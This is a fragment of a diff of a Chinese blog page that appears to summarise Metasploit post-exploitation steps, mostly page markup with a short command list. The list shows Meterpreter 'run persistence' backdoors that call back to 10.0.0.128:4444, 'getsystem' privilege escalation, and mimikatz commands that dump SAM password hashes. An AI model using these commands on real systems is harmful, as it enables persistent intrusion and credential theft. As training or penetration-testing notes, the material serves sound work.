+run persistence -h<br>run persistence -X -i 10 -p 4444 -r 10.0.0.128<br>run persistence -U -i 20 -p 4444 -r 10.0.0.128<br>run persistence -S -i 20 -p 4444 -r 10.0.0.128<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##### mimikatz</span><br><span class="line"></span><br><span class="line">- hashdump 使用的就是 mimikatz 的部分功能</span><br></pre></td></tr></table></figure>
+getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��tspkg ��livessp<br>mimikatz_command -h<br>mimikatz_command -f a::<br>mimikatz_command -f samdump::hashes<br>mimikatz_command -f handle::list<br>mimikatz_command -f service::list<br>mimikatz_command -f crypto::listProviders<br>mimikatz_command -f winmine::infos # 扫雷游戏<pre><code>
+
+</code></pre></li>
+</ul>
+
       
     </div>
     
@@ -417,6 +536,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/msf%E5%90%8E%E6%B8%97%E9%80%8F/" rel="tag"># msf后渗透</a>
+          
+        </div>
       
 
       
@@ -491,8 +616,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -511,7 +645,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-count">44</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -533,7 +667,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -603,6 +737,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#msf后渗透常见操作总结"><span class="nav-number">1.</span> <span class="nav-text">msf后渗透常见操作总结</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-准备工作"><span class="nav-number">1.0.1.</span> <span class="nav-text">1.准备工作</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Active-sessions"><span class="nav-number"></span> <span class="nav-text">Active sessions</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Active-sessions-1"><span class="nav-number"></span> <span class="nav-text">Active sessions</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#开启服务"><span class="nav-number"></span> <span class="nav-text">开启服务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#关闭服务"><span class="nav-number"></span> <span class="nav-text">关闭服务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#开启服务-1"><span class="nav-number"></span> <span class="nav-text">开启服务</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
